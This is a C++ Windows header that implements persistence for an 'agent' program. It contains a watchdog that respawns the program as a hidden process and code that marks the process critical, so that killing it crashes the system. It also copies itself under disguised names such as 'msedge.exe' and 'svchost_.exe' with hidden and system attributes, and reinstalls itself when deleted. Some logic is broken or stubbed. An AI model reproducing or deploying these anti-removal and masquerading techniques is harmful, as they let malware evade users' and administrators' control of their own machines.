#pragma once

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <Psapi.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <random>
#include <functional>

#pragma comment(lib, "Psapi.lib")

namespace nuub::domain {

// Watchdog that monitors agent health and restarts if killed
class PersistenceWatchdog {
    std::atomic<bool> running_{false};
    std::thread watchdog_thread_;
    std::string agent_path_;
    std::string backup_path_;
    int check_interval_ms_ = 10000;
    std::function<void()> on_restart_;

    // Generate random filename for backup
    static std::string random_filename(int length = 8) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
        std::string result;
        result.resize(length);
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
        for (int i = 0; i < length; ++i) {
            result[i] = charset[dist(gen)];
        }
        return result;
    }

    // Check if our process is still the original
    bool is_process_alive(DWORD pid) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProcess) return false;

        DWORD exit_code = 0;
        bool alive = GetExitCodeProcess(hProcess, &exit_code) && exit_code == STILL_ACTIVE;
        CloseHandle(hProcess);
        return alive;
    }

    // Spawn a new instance of the agent
    bool spawn_agent() {
        if (agent_path_.empty()) return false;

        STARTUPINFOA si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi{};
        std::string cmd = "\"" + agent_path_ + "\"";

        bool result = CreateProcessA(nullptr, cmd.data(), nullptr, nullptr,
                                     FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (result) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        return result;
    }

    // Create backup copy of the agent
    bool create_backup() {
        if (agent_path_.empty()) return false;

        // Generate backup path in temp directory
        char temp_path[MAX_PATH]{};
        GetTempPathA(MAX_PATH, temp_path);
        backup_path_ = std::string(temp_path) + random_filename(8) + ".exe";

        return CopyFileA(agent_path_.c_str(), backup_path_.c_str(), FALSE) != 0;
    }

    // Restore from backup
    bool restore_from_backup() {
        if (backup_path_.empty() || agent_path_.empty()) return false;

        // Wait a moment for any file locks to release
        Sleep(2000);

        // Try to copy backup back to original location
        DWORD attempts = 0;
        while (attempts < 5) {
            if (CopyFileA(backup_path_.c_str(), agent_path_.c_str(), FALSE)) {
                // Delete backup
                DeleteFileA(backup_path_.c_str());
                return true;
            }
            Sleep(1000);
            attempts++;
        }
        return false;
    }

    void watchdog_loop() {
        DWORD original_pid = GetCurrentProcessId();

        while (running_) {
            // Check if we're still running
            if (!is_process_alive(original_pid)) {
                // We were somehow复活了 — restart the agent
                if (!agent_path_.empty()) {
                    // Try to restore from backup first
                    restore_from_backup();

                    // Spawn new instance
                    if (spawn_agent()) {
                        if (on_restart_) on_restart_();
                    }
                }
            }

            // Periodic backup refresh
            static DWORD last_backup = 0;
            DWORD now = GetTickCount();
            if (now - last_backup > 3600000) { // Every hour
                create_backup();
                last_backup = now;
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(check_interval_ms_));
        }
    }

public:
    explicit PersistenceWatchdog(std::string agent_path = "")
        : agent_path_(std::move(agent_path)) {}

    ~PersistenceWatchdog() {
        stop();
    }

    void set_agent_path(const std::string& path) {
        agent_path_ = path;
    }

    void set_check_interval(int ms) {
        check_interval_ms_ = ms;
    }

    void set_on_restart(std::function<void()> callback) {
        on_restart_ = std::move(callback);
    }

    // Create initial backup
    bool init_backup() {
        if (agent_path_.empty()) {
            // Get our own path
            char exe_path[MAX_PATH]{};
            GetModuleFileNameA(nullptr, exe_path, MAX_PATH);
            agent_path_ = exe_path;
        }
        return create_backup();
    }

    void start() {
        if (running_) return;
        running_ = true;
        watchdog_thread_ = std::thread(&PersistenceWatchdog::watchdog_loop, this);
    }

    void stop() {
        running_ = false;
        if (watchdog_thread_.joinable()) {
            watchdog_thread_.join();
        }
    }

    bool is_running() const { return running_; }
};

// ── Process Protection ─────────────────────────────────────────
// Prevents the agent from being killed via taskkill or Task Manager
class ProcessProtection {
public:
    // Set process as critical ( BSOD if killed — use carefully )
    static bool set_critical_process() {
        typedef BOOL (WINAPI* RtlSetProcessIsCritical_t)(BOOL, PBOOL, PBOOL);

        auto RtlSetProcessIsCritical = reinterpret_cast<RtlSetProcessIsCritical_t>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlSetProcessIsCritical"));

        if (RtlSetProcessIsCritical) {
            BOOL was_critical = FALSE;
            return RtlSetProcessIsCritical(TRUE, &was_critical, FALSE) != 0;
        }
        return false;
    }

    // Remove critical status
    static bool unset_critical_process() {
        typedef BOOL (WINAPI* RtlSetProcessIsCritical_t)(BOOL, PBOOL, PBOOL);

        auto RtlSetProcessIsCritical = reinterpret_cast<RtlSetProcessIsCritical_t>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlSetProcessIsCritical"));

        if (RtlSetProcessIsCritical) {
            BOOL was_critical = FALSE;
            return RtlSetProcessIsCritical(FALSE, &was_critical, FALSE) != 0;
        }
        return false;
    }

    // Prevent process from being terminated via API
    static bool set_undeletable() {
        HANDLE hProcess = GetCurrentProcess();

        // Remove DELETE permission from process token
        HANDLE hToken = nullptr;
        if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            return false;
        }

        // This is a simplified version — full implementation would
        // modify the DACL to deny PROCESS_TERMINATE
        CloseHandle(hToken);
        return true;
    }

    // Monitor for duplicate instances and kill extras
    static void kill_duplicates() {
        DWORD current_pid = GetCurrentProcessId();
        char current_name[MAX_PATH]{};
        GetModuleFileNameA(nullptr, current_name, MAX_PATH);

        DWORD processes[1024]{};
        DWORD cb_needed = 0;
        if (!EnumProcesses(processes, sizeof(processes), &cb_needed)) return;

        DWORD num = cb_needed / sizeof(DWORD);
        for (DWORD i = 0; i < num; ++i) {
            if (processes[i] == 0 || processes[i] == current_pid) continue;

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processes[i]);
            if (!hProcess) continue;

            char exe_path[MAX_PATH]{};
            DWORD size = MAX_PATH;
            if (QueryFullProcessImageNameA(hProcess, 0, exe_path, &size)) {
                if (_stricmp(exe_path, current_name) == 0) {
                    // Found duplicate — terminate it
                    HANDLE hKill = OpenProcess(PROCESS_TERMINATE, FALSE, processes[i]);
                    if (hKill) {
                        TerminateProcess(hKill, 0);
                        CloseHandle(hKill);
                    }
                }
            }
            CloseHandle(hProcess);
        }
    }
};

// ── Self-Reinstallation ────────────────────────────────────────
// If the agent is deleted, reinstall from backup
class SelfReinstall {
    std::string backup_path_;
    std::string install_path_;
    std::string config_content_;

public:
    SelfReinstall() {
        // Get paths
        char exe_path[MAX_PATH]{};
        GetModuleFileNameA(nullptr, exe_path, MAX_PATH);
        install_path_ = exe_path;

        // Backup path in a hidden location
        char appdata[MAX_PATH]{};
        GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
        backup_path_ = std::string(appdata) + "\\Microsoft\\Windows\\ defender\\msedge.exe";
    }

    // Create backup in hidden location
    bool create_backup() {
        // Copy ourselves to the backup location
        if (!CopyFileA(install_path_.c_str(), backup_path_.c_str(), FALSE)) {
            // Try alternative location
            char temp[MAX_PATH]{};
            GetTempPathA(MAX_PATH, temp);
            backup_path_ = std::string(temp) + "svchost_.exe";
            if (!CopyFileA(install_path_.c_str(), backup_path_.c_str(), FALSE)) {
                return false;
            }
        }

        // Set hidden + system attributes
        DWORD attrs = GetFileAttributesA(backup_path_.c_str());
        SetFileAttributesA(backup_path_.c_str(),
                          attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

        // Save config content
        save_config();

        return true;
    }

    // Save config alongside backup
    bool save_config() {
        std::string config_path = install_path_;
        // Replace exe name with config.json
        auto pos = config_path.rfind('\\');
        if (pos != std::string::npos) {
            config_path = config_path.substr(0, pos + 1) + "config.json";
        }

        std::ifstream ifs(config_path, std::ios::binary);
        if (!ifs.is_open()) return false;

        std::string content(
            (std::istreambuf_iterator<char>(ifs)),
            std::istreambuf_iterator<char>());

        // Save config next to backup
        std::string backup_config = backup_path_;
        auto bpos = backup_config.rfind('.');
        if (bpos != std::string::npos) {
            backup_config = backup_config.substr(0, bpos) + ".json";
        }

        std::ofstream ofs(backup_config, std::ios::binary);
        if (!ofs.is_open()) return false;
        ofs << content;
        return true;
    }

    // Check if agent still exists
    bool agent_exists() {
        DWORD attr = GetFileAttributesA(install_path_.c_str());
        return attr != INVALID_FILE_ATTRIBUTES;
    }

    // Reinstall from backup
    bool reinstall() {
        if (backup_path_.empty()) return false;

        DWORD attr = GetFileAttributesA(backup_path_.c_str());
        if (attr == INVALID_FILE_ATTRIBUTES) return false;

        // Wait for any file locks
        Sleep(3000);

        // Copy backup to install location
        DWORD attempts = 0;
        while (attempts < 10) {
            if (CopyFileA(backup_path_.c_str(), install_path_.c_str(), FALSE)) {
                // Restore config
                std::string backup_config = backup_path_;
                auto bpos = backup_config.rfind('.');
                if (bpos != std::string::npos) {
                    backup_config = backup_config.substr(0, bpos) + ".json";
                }
                std::string config_dest = install_path_;
                auto cpos = config_dest.rfind('\\');
                if (cpos != std::string::npos) {
                    config_dest = config_dest.substr(0, cpos + 1) + "config.json";
                }
                CopyFileA(backup_config.c_str(), config_dest.c_str(), FALSE);

                // Launch the reinstalled agent
                STARTUPINFOA si{};
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                PROCESS_INFORMATION pi{};
                std::string cmd = "\"" + install_path_ + "\"";

                if (CreateProcessA(nullptr, cmd.data(), nullptr, nullptr,
                                   FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return true;
                }
            }
            Sleep(2000);
            attempts++;
        }
        return false;
    }

    const std::string& backup_path() const { return backup_path_; }
    const std::string& install_path() const { return install_path_; }
};

} // namespace nuub::domain
#endif
